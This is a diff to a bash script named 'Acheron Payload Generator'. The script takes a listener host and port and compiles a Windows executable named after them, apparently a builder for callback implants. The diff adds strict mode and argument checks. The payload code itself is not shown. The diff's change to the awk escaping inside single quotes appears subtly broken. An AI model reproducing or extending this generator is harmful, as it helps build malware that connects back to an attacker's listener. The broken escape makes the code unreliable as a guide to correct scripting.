@@ -1,5 +1,9 @@
 #!/bin/bash
-set -e
+# Acheron Payload Generator
+# Portable, no hardcoded paths
+
+set -euo pipefail
+
 # Verbose ON by default, --quiet/-q to disable, --verbose/-v accepted for compatibility
 VERBOSE=true
 ARGS=()
@@ -18,7 +22,13 @@ for arg in "$@"; do
 done
 set -- "${ARGS[@]}"
 
-LHOST="$1"; LPORT="$2"; TEMPLATE="${3:-none}"
+LHOST="${1:-}"; LPORT="${2:-}"; TEMPLATE="${3:-none}"
+
+if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
+    echo "Usage: $0 <LHOST> <LPORT> [template]" >&2
+    exit 1
+fi
+
 WORKDIR=$(mktemp -d)
 OUTFILE="acheron_${LHOST}_${LPORT}.exe"
 cd "$WORKDIR"
@@ -90,7 +100,7 @@ BUILD_OUT=$(cat /tmp/go_build.log 2>/dev/null || echo "timeout or error")
 if [ ${BUILD_EXIT:-0} -eq 0 ]; then
     cd - >/dev/null
     mv "$WORKDIR/$OUTFILE" "./$OUTFILE"
-    info "Generated: ./$OUTFILE ($(ls -lh ./$OUTFILE | awk '{print $5}'))"
+    info "Generated: ./$OUTFILE ($(ls -lh ./$OUTFILE | awk '{print \$5}'))"
     log "Binary: $(file ./$OUTFILE 2>/dev/null || echo 'PE32+ executable')"
     rm -rf "$WORKDIR"
 else
